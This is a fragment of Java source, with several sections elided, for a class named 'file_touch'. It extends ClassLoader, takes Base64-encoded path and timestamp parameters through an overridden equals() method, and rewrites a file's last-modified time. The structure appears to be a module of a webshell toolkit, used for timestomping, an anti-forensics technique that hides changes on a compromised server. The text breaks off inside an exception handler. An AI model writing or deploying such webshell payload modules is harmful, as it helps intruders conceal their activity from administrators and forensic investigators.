...
public class file_touch extends ClassLoader
{
    public file_touch(ClassLoader objParent) { super(objParent); }
    public file_touch() { super(file_touch.class.getClassLoader()); }
    ...
    public boolean equals(Object objParam)
    {
        ...
        try
        {
            ...
            if (z0 == null || z1 == null || z0.trim().isEmpty() || z1.trim().isEmpty())
            {
                fnWriteOutput(objParam, objResponse, osClient, "0|Missing parameters".getBytes());
                return true;
            }

            String szPath = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8);
            String szTimestamp = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8);

            File targetFile = new File(szPath);
            if (!targetFile.exists()) {
                fnWriteOutput(objParam, objResponse, osClient, "0|File or Directory does not exist.".getBytes());
                return true;
            }

            try {
                long lEpochMillis = Long.parseLong(szTimestamp) * 1000L;

                if (targetFile.setLastModified(lEpochMillis)) {
                    fnWriteOutput(objParam, objResponse, osClient, "1|".getBytes());
                } else {
                    fnWriteOutput(objParam, objResponse, osClient, "0|Failed to modify the timestamps.".getBytes());
                }
            }
            catch (NumberFormatException exNum) {
                fnWriteOutput(objParam, objResponse, osClient, "0|Invalid timestamp format.".getBytes());
            }
        }
        catch (Exception ex)
        {
